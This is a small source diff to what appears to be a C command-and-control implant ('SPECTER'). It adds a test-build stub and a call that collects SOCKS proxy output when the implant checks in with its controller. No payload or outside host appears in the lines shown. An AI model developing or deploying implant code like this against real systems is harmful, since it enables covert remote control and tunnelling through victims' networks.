@@ -25,6 +25,11 @@ static COMMS_CONTEXT g_comms_ctx;
 
 #ifdef TEST_BUILD
 static QWORD g_test_tick_ms = 0;
+
+__attribute__((weak))
+void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
+    (void)ctx;
+}
 #endif
 
 /* ------------------------------------------------------------------ */
@@ -1483,6 +1488,8 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     COMMS_TRACE("[SPECTER] checkin: enter");
     if (!ctx || !ctx->config || !ctx->comms_ctx)
         return STATUS_INVALID_PARAMETER;
+
+    task_collect_socks_output(ctx);
 
     /* All heap-trackable pointers — no large stack buffers anywhere.
        Total stack footprint of this function: ~200 bytes (pointers + scalars). */
